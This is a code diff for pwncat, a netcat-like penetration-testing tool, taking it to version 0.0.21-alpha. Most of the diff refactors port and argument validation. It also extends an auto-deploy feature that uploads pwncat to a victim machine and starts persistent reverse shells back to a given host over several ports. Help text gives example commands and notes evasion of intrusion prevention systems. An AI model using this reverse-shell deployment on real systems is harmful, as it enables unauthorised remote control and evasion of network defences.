@@ -139,7 +139,7 @@ if os.environ.get(&#34;MYPY_CHECK&#34;, False):
 
 APPNAME = &#34;pwncat&#34;
 APPREPO = &#34;https://github.com/cytopia/pwncat&#34;
-VERSION = &#34;0.0.20-alpha&#34;
+VERSION = &#34;0.0.21-alpha&#34;
 
 # Default timeout for timeout-based sys.stdin and socket.recv
 TIMEOUT_READ_STDIN = 0.1
@@ -1589,7 +1589,9 @@ class Sock(object):
             infos = socket.getaddrinfo(host, port, family, socktype, proto, flags)
             addr = str(infos[0][4][0])
         except (AttributeError, socket.gaierror) as error:
-            raise socket.gaierror(error)  # type: ignore
+            msg = &#34;Resolving hostname: {} failed: {}&#34;.format(str(host), str(error))
+            self.__log.trace(msg)  # type: ignore
+            raise socket.gaierror(msg)  # type: ignore
         self.__log.debug(&#34;Resolved hostname: %s&#34;, addr)
         return addr
 
@@ -3055,7 +3057,7 @@ class CNCAutoDeploy(CNC):
         recv,  # type: Callable[[], Iterator[str]]
         cmd,  # type: str
         host,  # type: str
-        port,  # type: str
+        ports,  # type: List[int]
     ):
         # type: (...) -&gt; None
         try:
@@ -3070,24 +3072,25 @@ class CNCAutoDeploy(CNC):
         if not self.upload(local_path, remote_path):
             return
         # TODO: Ensure pwncat stays running
-        self.__start_pwncat(remote_path, cmd, host, port)
+        self.__start_pwncat(remote_path, cmd, host, ports)
         return
 
-    def __start_pwncat(self, remote_path, binary, host, port):
-        # type: (str, str, str, str) -&gt; None
-        command = []
-        command.append(&#34;nohup&#34;)
-        command.append(self.python)
-        command.append(remote_path)
-        command.append(&#34;--exec {}&#34;.format(binary))
-        command.append(&#34;--reconn&#34;)
-        command.append(&#34;--reconn-wait 1&#34;)
-        command.append(host)
-        command.append(port)
-        command.append(&#34;&amp;&#34;)
-        data = &#34; &#34;.join(command)
-        print(&#34;Starting pwncat rev shell: {}&#34;.format(data))
-        self.remote_command(data)
+    def __start_pwncat(self, remote_path, binary, host, ports):
+        # type: (str, str, str, List[int]) -&gt; None
+        for port in ports:
+            command = []
+            command.append(&#34;nohup&#34;)
+            command.append(self.python)
+            command.append(remote_path)
+            command.append(host)
+            command.append(str(port))
+            command.append(&#34;--exec {}&#34;.format(binary))
+            command.append(&#34;--reconn&#34;)
+            command.append(&#34;--reconn-wait 1&#34;)
+            command.append(&#34;&amp;&#34;)
+            data = &#34; &#34;.join(command)
+            print(&#34;Starting pwncat rev shell: {}&#34;.format(data))
+            self.remote_command(data)
 
 
 # #################################################################################################
@@ -3109,120 +3112,199 @@ def get_version():
     )
 
 
-def _args_check_lf(value):
-    # type: (Optional[str]) -&gt; Optional[str]
-    &#34;&#34;&#34;Evaluate a yes/no choice into True, False or None.&#34;&#34;&#34;
-    if value is None:
-        return None
-    if value.lower() in [&#34;crlf&#34;, &#34;lf&#34;, &#34;cr&#34;, &#34;no&#34;]:
-        return value.lower()
-    raise argparse.ArgumentTypeError(&#34;&#39;%s&#39; is an invalid choice&#34; % value)
+class ArgValidator(object):
+    &#34;&#34;&#34;Validate command line arguments.&#34;&#34;&#34;
 
-
-def _args_check_tos(value):
-    # type: (str) -&gt; str
-    if value not in [&#34;mincost&#34;, &#34;lowcost&#34;, &#34;reliability&#34;, &#34;throughput&#34;, &#34;lowdelay&#34;]:
-        raise argparse.ArgumentTypeError(&#34;%s is an invalid tos definition&#34; % value)
-    return value
-
-
-def _args_check_info(value):
-    # type: (str) -&gt; str
-    if value not in [&#34;sock&#34;, &#34;ipv4&#34;, &#34;ipv6&#34;, &#34;tcp&#34;, &#34;all&#34;, &#34;&#34;]:
-        raise argparse.ArgumentTypeError(&#34;%s is an invalid info definition&#34; % value)
-    return value
-
-
-def _args_check_color(value):
-    # type: (str) -&gt; str
-    if value not in [&#34;auto&#34;, &#34;always&#34;, &#34;never&#34;]:
-        raise argparse.ArgumentTypeError(&#34;%s is an invalid color definition&#34; % value)
-    return value
-
-
-def _args_check_upload_myself(value):
-    # type: (str) -&gt; str
-    opts = value.split(&#34;:&#34;)
-    if len(opts) != 3:
-        raise argparse.ArgumentTypeError(&#34;%s is an invalid cmd[:host]:port definition&#34; % value)
-    _args_check_port(opts[-1])
-    return value
-
-
-def _args_check_script(value):
-    # type: (str) -&gt; str
-    if not os.path.isfile(value):
-        raise argparse.ArgumentTypeError(&#34;File not found: %s&#34; % value)
-
-    fhandle = open(value, mode=&#34;r&#34;)
-    script = fhandle.read()
-    fhandle.close()
-    return script
-
-
-def _args_check_port(value):
-    # type: (str) -&gt; int
-    &#34;&#34;&#34;Check arguments for invalid port number.&#34;&#34;&#34;
-    min_port = 1
-    max_port = 65535
-    intvalue = int(value)
-
-    if intvalue &lt; min_port or intvalue &gt; max_port:
-        raise argparse.ArgumentTypeError(&#34;%s is an invalid port number&#34; % value)
-    return intvalue
-
-
-def _args_check_forwards(value):
-    # type: (str) -&gt; str
-    &#34;&#34;&#34;Check forward argument (-L/-R) for correct pattern.&#34;&#34;&#34;
-    match = re.search(r&#34;(.+):(.+)&#34;, value)
-    if match is None or len(match.groups()) != 2:
-        raise argparse.ArgumentTypeError(&#34;%s is not a valid &#39;addr:port&#39; format.&#34; % value)
-    _args_check_port(match.group(2))
-    return value
-
-
-def _args_check_local_forward(value):
-    # type: (str) -&gt; str
-    &#34;&#34;&#34;Check forward argument (-L/-R) for correct pattern.&#34;&#34;&#34;
-    match = re.search(r&#34;^(.+:)?([0-9]+)$&#34;, value)
-    if match is None or len(match.groups()) != 2:
-        raise argparse.ArgumentTypeError(&#34;%s is not a valid &#39;[addr:]port&#39; format.&#34; % value)
-    _args_check_port(match.group(2))
-    if match.group(1) is None:
-        return &#34;:&#34; + match.group(2)
-    return value
-
-
-def _args_check_robin_ports(value):
-    # type: (str) -&gt; List[int]
-    &#34;&#34;&#34;Check round-robin argument for comma separated string or range.&#34;&#34;&#34;
-    mcomma = re.search(r&#34;^[0-9]+(,([0-9]+))*$&#34;, value)
-    mrange = re.search(r&#34;^[0-9]+\-[0-9]+$&#34;, value)
-
-    if mcomma is None:
-        if mrange is None:
-            raise argparse.ArgumentTypeError(&#34;%s is not a valid port specifier&#34; % value)
-
-    if mcomma:
-        ports = [int(port) for port in mcomma.group(0).split(&#34;,&#34;)]
-        for port in ports:
-            _args_check_port(str(port))
-        return ports
-
-    if mrange:
-        ranges = [int(r) for r in mrange.group(0).split(&#34;-&#34;)]
-        if ranges[0] &gt;= (ranges[1] + 1):
-            raise argparse.ArgumentTypeError(
-                &#34;Left side of range must be smaller or equal than right side.&#34;
-            )
+    # --------------------------------------------------------------------------
+    # Private Functions
+    # --------------------------------------------------------------------------
+    @staticmethod
+    def __get_port_list_by_comma(value):
+        # type: (str) -&gt; List[int]
+        &#34;&#34;&#34;Returns a list of ports from a comma separated string or empty list if invalid.&#34;&#34;&#34;
         ports = []
-        for port in range(ranges[0], ranges[1] + 1):
-            _args_check_port(str(port))
-            ports.append(port)
+        match = re.search(r&#34;^[0-9]+(,([0-9]+))*$&#34;, value)
+        if match is not None:
+            ports = [int(port) for port in match.group(0).split(&#34;,&#34;)]
+            for port in ports:
+                if not ArgValidator.is_valid_port(port):
+                    return []
         return ports
 
-    return []
+    @staticmethod
+    def __get_port_list_by_range(value):
+        # type: (str) -&gt; List[int]
+        &#34;&#34;&#34;Returns a list of ports from a range string or empty list if invalid.&#34;&#34;&#34;
+        ports = []  # type: List[int]
+        match = re.search(r&#34;^[0-9]+\-[0-9]+$&#34;, value)
+        if match is not None:
+            ranges = [int(r) for r in match.group(0).split(&#34;-&#34;)]
+            ports = list(range(ranges[0], ranges[1] + 1))
+            for port in ports:
+                if not ArgValidator.is_valid_port(port):
+                    return []
+        return ports
+
+    @staticmethod
+    def __get_port_list_by_incr(value):
+        # type: (str) -&gt; List[int]
+        &#34;&#34;&#34;Returns a list of ports from an increment or empty list if invalid.&#34;&#34;&#34;
+        ports = []  # type: List[int]
+        match = re.search(r&#34;^[0-9]+\+[0-9]+$&#34;, value)
+        if match is not None:
+            ranges = [int(r) for r in match.group(0).split(&#34;+&#34;)]
+            ports = list(range(ranges[0], ranges[0] + ranges[1] + 1))
+            for port in ports:
+                if not ArgValidator.is_valid_port(port):
+                    return []
+        return ports
+
+    # --------------------------------------------------------------------------
+    # Helper Functions
+    # --------------------------------------------------------------------------
+    @staticmethod
+    def is_valid_port(value):
+        # type: (int) -&gt; bool
+        &#34;&#34;&#34;Returns True if a given value is a valid port.&#34;&#34;&#34;
+        return 0 &lt; value &lt; 65536
+
+    @staticmethod
+    def is_valid_port_list(value):
+        # type: (str) -&gt; bool
+        &#34;&#34;&#34;Returns True if a given value is a valid port list by comma or range.&#34;&#34;&#34;
+        cports = ArgValidator.__get_port_list_by_comma(value)
+        rports = ArgValidator.__get_port_list_by_range(value)
+        iports = ArgValidator.__get_port_list_by_incr(value)
+        # XOR - only one method (comma, range or increment) is allowed
+        if cports and not rports and not iports:
+            return True
+        if rports and not cports and not iports:
+            return True
+        if iports and not cports and not rports:
+            return True
+        return False
+
+    @staticmethod
+    def get_port_list_from_string(value):
+        # type: (str) -&gt; List[int]
+        &#34;&#34;&#34;Returns a list of ports from an comma, range or increment.&#34;&#34;&#34;
+        cports = ArgValidator.__get_port_list_by_comma(value)
+        rports = ArgValidator.__get_port_list_by_range(value)
+        iports = ArgValidator.__get_port_list_by_incr(value)
+        return cports + rports + iports
+
+    # --------------------------------------------------------------------------
+    # Generic Type Functions
+    # --------------------------------------------------------------------------
+    @staticmethod
+    def type_port(value):
+        # type: (str) -&gt; int
+        &#34;&#34;&#34;Check argument for valid port.&#34;&#34;&#34;
+        if not ArgValidator.is_valid_port(int(value)):
+            raise argparse.ArgumentTypeError(&#34;%s is an invalid port number.&#34; % value)
+        return int(value)
+
+    @staticmethod
+    def type_port_list(value):
+        # type: (str) -&gt; List[int]
+        &#34;&#34;&#34;Check argument for valid port list separated by comma or range number.&#34;&#34;&#34;
+        rports = ArgValidator.__get_port_list_by_range(value)
+        cports = ArgValidator.__get_port_list_by_comma(value)
+        iports = ArgValidator.__get_port_list_by_incr(value)
+
+        # Only use comma, range or increment!
+        if (rports and cports) or (rports and iports) or (cports and iports):
+            raise argparse.ArgumentTypeError(
+                &#34;%s is invalid. Can only use comma, range or increment.&#34; % value
+            )
+        if not rports and not cports and not iports:
+            raise argparse.ArgumentTypeError(&#34;%s is an invalid port-list/range definition.&#34; % value)
+        # Return whichever has a value
+        return rports + cports + iports
+
+    @staticmethod
+    def type_file_content(value):
+        # type: (str) -&gt; str
+        &#34;&#34;&#34;Check argument for valid file content (file must exist and be readable).&#34;&#34;&#34;
+        if not os.path.isfile(value):
+            raise argparse.ArgumentTypeError(&#34;File not found: %s&#34; % value)
+        fhandle = open(value, mode=&#34;r&#34;)
+        script = fhandle.read()
+        fhandle.close()
+        return script
+
+    # --------------------------------------------------------------------------
+    # Specific Type Functions
+    # --------------------------------------------------------------------------
+    @staticmethod
+    def type_tos(value):
+        # type: (str) -&gt; str
+        &#34;&#34;&#34;Check argument for valid --tos value.&#34;&#34;&#34;
+        if value not in [&#34;mincost&#34;, &#34;lowcost&#34;, &#34;reliability&#34;, &#34;throughput&#34;, &#34;lowdelay&#34;]:
+            raise argparse.ArgumentTypeError(&#34;%s is an invalid tos definition.&#34; % value)
+        return value
+
+    @staticmethod
+    def type_info(value):
+        # type: (str) -&gt; str
+        &#34;&#34;&#34;Check argument for valid --info value.&#34;&#34;&#34;
+        if value not in [&#34;sock&#34;, &#34;ipv4&#34;, &#34;ipv6&#34;, &#34;tcp&#34;, &#34;all&#34;, &#34;&#34;]:
+            raise argparse.ArgumentTypeError(&#34;%s is an invalid info definition.&#34; % value)
+        return value
+
+    @staticmethod
+    def type_crlf(value):
+        # type: (Optional[str]) -&gt; Optional[str]
+        &#34;&#34;&#34;Check argument for valid --crlf value.&#34;&#34;&#34;
+        if value is None:
+            return None
+        if value.lower() in [&#34;crlf&#34;, &#34;lf&#34;, &#34;cr&#34;, &#34;no&#34;]:
+            return value.lower()
+        raise argparse.ArgumentTypeError(&#34;&#39;%s&#39; is an invalid choice.&#34; % value)
+
+    @staticmethod
+    def type_color(value):
+        # type: (str) -&gt; str
+        &#34;&#34;&#34;Check argument for valid --color value.&#34;&#34;&#34;
+        if value not in [&#34;auto&#34;, &#34;always&#34;, &#34;never&#34;]:
+            raise argparse.ArgumentTypeError(&#34;%s is an invalid color definition.&#34; % value)
+        return value
+
+    @staticmethod
+    def type_local(value):
+        # type: (str) -&gt; str
+        &#34;&#34;&#34;Check argument for valid -L/--local value.&#34;&#34;&#34;
+        match = re.search(r&#34;^(.+:)?([0-9]+)$&#34;, value)
+        if match is None or len(match.groups()) != 2:
+            raise argparse.ArgumentTypeError(&#34;%s is not a valid &#39;[addr:]port&#39; format.&#34; % value)
+        if not ArgValidator.is_valid_port(int(match.group(2))):
+            raise argparse.ArgumentTypeError(&#34;%s is not a valid port.&#34; % value)
+
+        if match.group(1) is None:
+            return &#34;:&#34; + match.group(2)
+        return value
+
+    @staticmethod
+    def type_remote(value):
+        # type: (str) -&gt; str
+        &#34;&#34;&#34;Check argument for valid -R/--remote value.&#34;&#34;&#34;
+        match = re.search(r&#34;(.+):(.+)&#34;, value)
+        if match is None or len(match.groups()) != 2:
+            raise argparse.ArgumentTypeError(&#34;%s is not a valid &#39;addr:port&#39; format.&#34; % value)
+        if not ArgValidator.is_valid_port(int(match.group(2))):
+            raise argparse.ArgumentTypeError(&#34;%s is not a valid port.&#34; % value)
+        return value
+
+    @staticmethod
+    def type_self_inject(value):
+        # type: (str) -&gt; str
+        &#34;&#34;&#34;Check argument for valid --self-inject value.&#34;&#34;&#34;
+        opts = value.split(&#34;:&#34;)
+        if len(opts) != 3:
+            raise argparse.ArgumentTypeError(&#34;%s is not a valid cmd:host:port[s] pattern.&#34; % value)
+        if not ArgValidator.is_valid_port_list(opts[-1]):
+            raise argparse.ArgumentTypeError(&#34;%s is an invalid port definition.&#34; % value)
+        return value
 
 
 def _args_check_mutually_exclusive(parser, args):
@@ -3411,7 +3493,7 @@ reconnect.&#34;&#34;&#34;,
         &#34;hostname&#34;, nargs=&#34;?&#34;, type=str, help=&#34;Address to listen, forward or connect to&#34;
     )
     positional.add_argument(
-        &#34;port&#34;, type=_args_check_port, help=&#34;Port to listen, forward or connect to&#34;
+        &#34;port&#34;, type=ArgValidator.type_port, help=&#34;Port to listen, forward or connect to&#34;
     )
 
     mode.add_argument(
@@ -3442,8 +3524,8 @@ Used for port scanning.
         &#34;-L&#34;,
         &#34;--local&#34;,
         metavar=&#34;[addr:]port&#34;,
+        type=ArgValidator.type_local,
         default=False,
-        type=_args_check_local_forward,
         help=&#34;&#34;&#34;[Local forward mode]:
 This mode will start a server and a client internally.
 The internal server will listen locally on specified
@@ -3459,8 +3541,8 @@ hostname/port given via positional arguments.
         &#34;-R&#34;,
         &#34;--remote&#34;,
         metavar=&#34;addr:port&#34;,
+        type=ArgValidator.type_remote,
         default=False,
-        type=_args_check_forwards,
         help=&#34;&#34;&#34;[Remote forward mode]:
 This mode will start two clients internally. One is
 connecting to the target and one is connecting to
@@ -3483,18 +3565,18 @@ target machine via the positional arguments.
     )
     optional.add_argument(
         &#34;-6&#34;,
-        dest=&#34;ipv6&#34;,
         action=&#34;store_true&#34;,
         default=False,
+        dest=&#34;ipv6&#34;,
         help=&#34;Only Use IPv6 instead of both, IPv4 and IPv6.&#34;,
     )
     optional.add_argument(
         &#34;-e&#34;,
         &#34;--exec&#34;,
         metavar=&#34;cmd&#34;,
-        dest=&#34;cmd&#34;,
-        default=False,
         type=str,
+        default=False,
+        dest=&#34;cmd&#34;,
         help=&#34;Execute shell command. Only for connect or listen mode.&#34;,
     )
     # TODO: add --crlf-i and --crlf-o to only do this on input or output and have
@@ -3502,8 +3584,8 @@ target machine via the positional arguments.
     optional.add_argument(
         &#34;-C&#34;,
         &#34;--crlf&#34;,
-        type=_args_check_lf,
         metavar=&#34;lf&#34;,
+        type=ArgValidator.type_crlf,
         default=None,
         help=&#34;&#34;&#34;Specify, &#39;lf&#39;, &#39;crlf&#39; or &#39;cr&#39; to always force replacing
 line endings for input and outout accordingly. Specify
@@ -3526,8 +3608,8 @@ CR on MacOS).&#34;&#34;&#34;,
         &#34;-T&#34;,
         &#34;--tos&#34;,
         metavar=&#34;str&#34;,
+        type=ArgValidator.type_tos,
         default=None,
-        type=_args_check_tos,
         help=&#34;&#34;&#34;Specifies IP Type of Service (ToS) for the connection.
 Valid values are the tokens &#39;mincost&#39;, &#39;lowcost&#39;,
 &#39;reliability&#39;, &#39;throughput&#39; or &#39;lowdelay&#39;.
@@ -3536,17 +3618,17 @@ Valid values are the tokens &#39;mincost&#39;, &#39;lowcost&#39;,
     optional.add_argument(
         &#34;--source-addr&#34;,
         metavar=&#34;addr&#34;,
-        dest=&#34;source_addr&#34;,
         type=str,
         default=None,
+        dest=&#34;source_addr&#34;,
         help=&#34;Specify the source IP address of the interface for connect mode.&#34;,
     )
     optional.add_argument(
         &#34;--source-port&#34;,
         metavar=&#34;port&#34;,
-        dest=&#34;source_port&#34;,
-        type=_args_check_port,
+        type=ArgValidator.type_port,
         default=None,
+        dest=&#34;source_port&#34;,
         help=&#34;Specify the source port for connect mode.&#34;,
     )
     optional.add_argument(
@@ -3561,8 +3643,8 @@ decrease drastically if you use more than three times.&#34;&#34;&#34;,
     optional.add_argument(
         &#34;--info&#34;,
         metavar=&#34;type&#34;,
+        type=ArgValidator.type_info,
         default=&#34;&#34;,
-        type=_args_check_info,
         help=&#34;&#34;&#34;Show additional info about sockets, ip4/6 or tcp opts
 applied to the current socket connection. Valid
 parameter are &#39;sock&#39;, &#39;ipv4&#39;, &#39;ipv6&#39;, &#39;tcp&#39; or &#39;all&#39;.
@@ -3573,8 +3655,8 @@ to see them (-vv).&#34;&#34;&#34;,
         &#34;-c&#34;,
         &#34;--color&#34;,
         metavar=&#34;str&#34;,
+        type=ArgValidator.type_color,
         default=&#34;auto&#34;,
-        type=_args_check_color,
         help=&#34;&#34;&#34;Colored log output. Specify &#39;always&#39;, &#39;never&#39; or &#39;auto&#39;.
 In &#39;auto&#39; mode, color is displayed as long as the output
 goes to a terminal. If it is piped into a file, color
@@ -3585,9 +3667,9 @@ color on Windows by default. (default: auto)
 
     cnc.add_argument(
         &#34;--self-inject&#34;,
-        metavar=&#34;cmd:host:port&#34;,
+        metavar=&#34;cmd:host:port[s]&#34;,
+        type=ArgValidator.type_self_inject,
         default=None,
-        type=_args_check_upload_myself,
         help=&#34;&#34;&#34;Listen mode (TCP only):
 If you are about to inject a reverse shell onto the
 victim machine (via php, bash, nc, ncat or similar),
@@ -3597,6 +3679,11 @@ automatically deploy and background-run an unbreakable
 pwncat reverse shell onto the victim machine which then
 also connects back to you with specified arguments.
 Example: &#39;--self-inject /bin/bash:10.0.0.1:4444&#39;
+It is also possible to launch multiple reverse shells by
+specifying multiple ports.
+Via list:  --self-inject /bin/sh:10.0.0.1:4444,4445,4446
+Via range: --self-inject /bin/sh:10.0.0.1:4444-4446
+Via incr:  --self-inject /bin/sh:10.0.0.1:4444+2
 Note: this is currently an experimental feature and does
 not work on Windows remote hosts yet.
 &#34;&#34;&#34;,
@@ -3604,8 +3691,8 @@ not work on Windows remote hosts yet.
     advanced.add_argument(
         &#34;--script-send&#34;,
         metavar=&#34;file&#34;,
+        type=ArgValidator.type_file_content,
         default=None,
-        type=_args_check_script,
         help=&#34;&#34;&#34;All modes (TCP and UDP):
 A Python scripting engine to define your own custom
 transformer function which will be executed before
@@ -3628,8 +3715,8 @@ file will be called with exec().
     advanced.add_argument(
         &#34;--script-recv&#34;,
         metavar=&#34;file&#34;,
+        type=ArgValidator.type_file_content,
         default=None,
-        type=_args_check_script,
         help=&#34;&#34;&#34;All modes (TCP and UDP):
 A Python scripting engine to define your own custom
 transformer function which will be executed after
@@ -3683,8 +3770,8 @@ disconnected or the connection is unterrupted otherwise.
         &#34;--rebind&#34;,
         metavar=&#34;x&#34;,
         nargs=&#34;?&#34;,
-        default=0,
         type=int,
+        default=0,
         help=&#34;&#34;&#34;Listen mode (TCP and UDP):
 If the server is unable to bind, it will re-initialize
 itself x many times before giving up. Omit the
@@ -3698,8 +3785,8 @@ See --rebind-robin for an interesting use-case.
     advanced.add_argument(
         &#34;--rebind-wait&#34;,
         metavar=&#34;s&#34;,
-        default=1.0,
         type=float,
+        default=1.0,
         help=&#34;&#34;&#34;Listen mode (TCP and UDP):
 Wait x seconds between re-initialization. (default: 1)
 
@@ -3708,13 +3795,14 @@ Wait x seconds between re-initialization. (default: 1)
     advanced.add_argument(
         &#34;--rebind-robin&#34;,
         metavar=&#34;port&#34;,
+        type=ArgValidator.type_port_list,
         default=[],
-        type=_args_check_robin_ports,
         help=&#34;&#34;&#34;Listen mode (TCP and UDP):
 If the server is unable to initialize (e.g: cannot bind
 and --rebind is specified, it it will shuffle ports in
-round-robin mode to bind to. Use comma separated string
-such as &#39;80,81,82&#39; or a range of ports &#39;80-100&#39;.
+round-robin mode to bind to.
+Use comma separated string such as &#39;80,81,82,83&#39;, a range
+of ports &#39;80-83&#39; or an increment &#39;80+3&#39;.
 Set --rebind to at least the number of ports to probe +1
 This option requires --rebind to be specified.
 
@@ -3724,6 +3812,7 @@ This option requires --rebind to be specified.
         &#34;--reconn&#34;,
         metavar=&#34;x&#34;,
         nargs=&#34;?&#34;,
+        type=int,
         default=0,
         help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP only):
 If the remote server is not reachable or the connection
@@ -3740,8 +3829,8 @@ This might be handy for stable TCP reverse shells ;-)
     advanced.add_argument(
         &#34;--reconn-wait&#34;,
         metavar=&#34;s&#34;,
-        default=1.0,
         type=float,
+        default=1.0,
         help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP only):
 Wait x seconds between re-connects. (default: 1)
 
@@ -3750,14 +3839,14 @@ Wait x seconds between re-connects. (default: 1)
     advanced.add_argument(
         &#34;--reconn-robin&#34;,
         metavar=&#34;port&#34;,
+        type=ArgValidator.type_port_list,
         default=[],
-        type=_args_check_robin_ports,
         help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP only):
 If the remote server is not reachable or the connection
 is interrupted and --reconn is specified, the client
 will shuffle ports in round-robin mode to connect to.
-Use comma separated string such as &#39;80,81,82&#39; or a range
-of ports &#39;80-100&#39;.
+Use comma separated string such as &#39;80,81,82,83&#39;, a range
+of ports &#39;80-83&#39; or an increment &#39;80+3&#39;.
 Set --reconn to at least the number of ports to probe +1
 This helps reverse shell to evade intrusiona prevention
 systems that will cut your connection and block the
@@ -3771,8 +3860,8 @@ figure out what outbound ports are allowed.
         &#34;-w&#34;,
         &#34;--wait&#34;,
         metavar=&#34;s&#34;,
-        default=False,
         type=int,
+        default=False,
         help=&#34;&#34;&#34;Connect mode (TCP only):
 If a connection and stdin are idle for more than s sec,
 then the connection is silently closed and the client
@@ -3808,8 +3897,8 @@ ping packet (default: &#39;\\0&#39;)
     advanced.add_argument(
         &#34;--ping-intvl&#34;,
         metavar=&#34;s&#34;,
-        default=False,
         type=int,
+        default=False,
         help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP and UDP):
 Instruct the client to send ping intervalls every s sec.
 This allows you to restart your UDP server and just wait
@@ -3823,8 +3912,8 @@ ping packet (default: &#39;\\0&#39;)
     advanced.add_argument(
         &#34;--ping-word&#34;,
         metavar=&#34;str&#34;,
-        default=&#34;\0&#34;,
         type=str,
+        default=&#34;\0&#34;,
         help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP and UDP):
 Change the default character &#39;\\0&#39; to use for upd ping.
 Single character or strings are supported.
@@ -3834,12 +3923,14 @@ Single character or strings are supported.
     advanced.add_argument(
         &#34;--ping-robin&#34;,
         metavar=&#34;port&#34;,
+        type=ArgValidator.type_port_list,
         default=[],
-        type=_args_check_robin_ports,
         help=&#34;&#34;&#34;Connect mode / Zero-I/O mode (TCP and UDP):
 Instruct the client to shuffle the specified ports in
 round-robin mode for a remote server to ping.
 This might be handy to scan outbound allowed ports.
+Use comma separated string such as &#39;80,81,82,83&#39;, a range
+of ports &#39;80-83&#39; or an increment &#39;80+3&#39;.
 Use --ping-intvl 0 to be faster.
 
 &#34;&#34;&#34;,
@@ -3847,8 +3938,8 @@ Use --ping-intvl 0 to be faster.
     advanced.add_argument(
         &#34;--safe-word&#34;,
         metavar=&#34;str&#34;,
-        default=False,
         type=str,
+        default=False,
         help=&#34;&#34;&#34;All modes:
 If %(prog)s is started with this argument, it will shut
 down as soon as it receives the specified string. The
@@ -4060,7 +4151,8 @@ def main():
         # This will hand over to normal listening server on success or failure
         if args.self_inject:
             cnc_cmd, cnc_host, cnc_port = args.self_inject.split(&#34;:&#34;)
-            CNCAutoDeploy(enc, net.consumer, net.producer, cnc_cmd, cnc_host, cnc_port)
+            cnc_ports = ArgValidator.get_port_list_from_string(cnc_port)
+            CNCAutoDeploy(enc, net.consumer, net.producer, cnc_cmd, cnc_host, cnc_ports)
         run = Runner(PSEStore(ssig, [net]))
         run.add_action(
             &#34;RECV&#34;,
@@ -4183,7 +4275,7 @@ reconnect.&#34;&#34;&#34;,
         &#34;hostname&#34;, nargs=&#34;?&#34;, type=str, help=&#34;Address to listen, forward or connect to&#34;
     )
     positional.add_argument(
-        &#34;port&#34;, type=_args_check_port, help=&#34;Port to listen, forward or connect to&#34;
+        &#34;port&#34;, type=ArgValidator.type_port, help=&#34;Port to listen, forward or connect to&#34;
     )
 
     mode.add_argument(
@@ -4214,8 +4306,8 @@ Used for port scanning.
         &#34;-L&#34;,
         &#34;--local&#34;,
         metavar=&#34;[addr:]port&#34;,
+        type=ArgValidator.type_local,
         default=False,
-        type=_args_check_local_forward,
         help=&#34;&#34;&#34;[Local forward mode]:
 This mode will start a server and a client internally.
 The internal server will listen locally on specified
@@ -4231,8 +4323,8 @@ hostname/port given via positional arguments.
         &#34;-R&#34;,
         &#34;--remote&#34;,
         metavar=&#34;addr:port&#34;,
+        type=ArgValidator.type_remote,
         default=False,
-        type=_args_check_forwards,
         help=&#34;&#34;&#34;[Remote forward mode]:
 This mode will start two clients internally. One is
 connecting to the target and one is connecting to
@@ -4255,18 +4347,18 @@ target machine via the positional arguments.
     )
     optional.add_argument(
         &#34;-6&#34;,
-        dest=&#34;ipv6&#34;,
         action=&#34;store_true&#34;,
         default=False,
+        dest=&#34;ipv6&#34;,
         help=&#34;Only Use IPv6 instead of both, IPv4 and IPv6.&#34;,
     )
     optional.add_argument(
         &#34;-e&#34;,
         &#34;--exec&#34;,
         metavar=&#34;cmd&#34;,
-        dest=&#34;cmd&#34;,
-        default=False,
         type=str,
+        default=False,
+        dest=&#34;cmd&#34;,
         help=&#34;Execute shell command. Only for connect or listen mode.&#34;,
     )
     # TODO: add --crlf-i and --crlf-o to only do this on input or output and have
@@ -4274,8 +4366,8 @@ target machine via the positional arguments.
     optional.add_argument(
         &#34;-C&#34;,
         &#34;--crlf&#34;,
-        type=_args_check_lf,
         metavar=&#34;lf&#34;,
+        type=ArgValidator.type_crlf,
         default=None,
         help=&#34;&#34;&#34;Specify, &#39;lf&#39;, &#39;crlf&#39; or &#39;cr&#39; to always force replacing
 line endings for input and outout accordingly. Specify
@@ -4298,8 +4390,8 @@ CR on MacOS).&#34;&#34;&#34;,
         &#34;-T&#34;,
         &#34;--tos&#34;,
         metavar=&#34;str&#34;,
+        type=ArgValidator.type_tos,
         default=None,
-        type=_args_check_tos,
         help=&#34;&#34;&#34;Specifies IP Type of Service (ToS) for the connection.
 Valid values are the tokens &#39;mincost&#39;, &#39;lowcost&#39;,
 &#39;reliability&#39;, &#39;throughput&#39; or &#39;lowdelay&#39;.
@@ -4308,17 +4400,17 @@ Valid values are the tokens &#39;mincost&#39;, &#39;lowcost&#39;,
     optional.add_argument(
         &#34;--source-addr&#34;,
         metavar=&#34;addr&#34;,
-        dest=&#34;source_addr&#34;,
         type=str,
         default=None,
+        dest=&#34;source_addr&#34;,
         help=&#34;Specify the source IP address of the interface for connect mode.&#34;,
     )
     optional.add_argument(
         &#34;--source-port&#34;,
         metavar=&#34;port&#34;,
-        dest=&#34;source_port&#34;,
-        type=_args_check_port,
+        type=ArgValidator.type_port,
         default=None,
+        dest=&#34;source_port&#34;,
         help=&#34;Specify the source port for connect mode.&#34;,
     )
     optional.add_argument(
@@ -4333,8 +4425,8 @@ decrease drastically if you use more than three times.&#34;&#34;&#34;,
     optional.add_argument(
         &#34;--info&#34;,
         metavar=&#34;type&#34;,
+        type=ArgValidator.type_info,
         default=&#34;&#34;,
-        type=_args_check_info,
         help=&#34;&#34;&#34;Show additional info about sockets, ip4/6 or tcp opts
 applied to the current socket connection. Valid
 parameter are &#39;sock&#39;, &#39;ipv4&#39;, &#39;ipv6&#39;, &#39;tcp&#39; or &#39;all&#39;.
@@ -4345,8 +4437,8 @@ to see them (-vv).&#34;&#34;&#34;,
         &#34;-c&#34;,
         &#34;--color&#34;,
         metavar=&#34;str&#34;,
+        type=ArgValidator.type_color,
         default=&#34;auto&#34;,
-        type=_args_check_color,
         help=&#34;&#34;&#34;Colored log output. Specify &#39;always&#39;, &#39;never&#39; or &#39;auto&#39;.
 In &#39;auto&#39; mode, color is displayed as long as the output
 goes to a terminal. If it is piped into a file, color
@@ -4357,9 +4449,9 @@ color on Windows by default. (default: auto)
 
     cnc.add_argument(
         &#34;--self-inject&#34;,
-        metavar=&#34;cmd:host:port&#34;,
+        metavar=&#34;cmd:host:port[s]&#34;,
+        type=ArgValidator.type_self_inject,
         default=None,
-        type=_args_check_upload_myself,
         help=&#34;&#34;&#34;Listen mode (TCP only):
 If you are about to inject a reverse shell onto the
 victim machine (via php, bash, nc, ncat or similar),
